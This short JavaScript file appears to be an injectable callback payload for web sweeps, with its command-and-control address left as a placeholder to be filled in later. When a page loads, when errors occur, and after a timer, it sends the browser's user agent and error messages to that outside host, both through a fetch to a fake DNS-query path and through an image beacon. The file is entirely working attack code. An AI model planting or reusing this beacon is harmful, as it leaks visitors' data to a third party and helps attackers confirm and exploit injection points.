(function () {
  var C2 = "__CALLBACK__";                      // injected at sweep time
  function enc(s) { return btoa(unescape(encodeURIComponent(s))).replace(/=+$/, ""); }
  function send(tag, data) {
    var d = enc(tag + "|" + (data || "") + "|" + (navigator.userAgent || "").slice(0, 48));
    // primary: DoH JSON over fetch
    try {
      fetch(C2 + "/dns-query?name=" + d + ".c2&type=TXT", { mode: "cors", cache: "no-store" })
        .catch(function () {});
    } catch (e) {}
    // reliable fallback: image beacon (tolerates weak TLS stacks)
    var img = new Image();
    img.src = C2 + "/beacon?d=" + d + "&t=" + Date.now();
  }
  send("load");
  window.addEventListener("error", function (e) { send("err", (e.message || "").slice(0, 80)); });
  setTimeout(function () { send("alive"); }, 1500);
})();
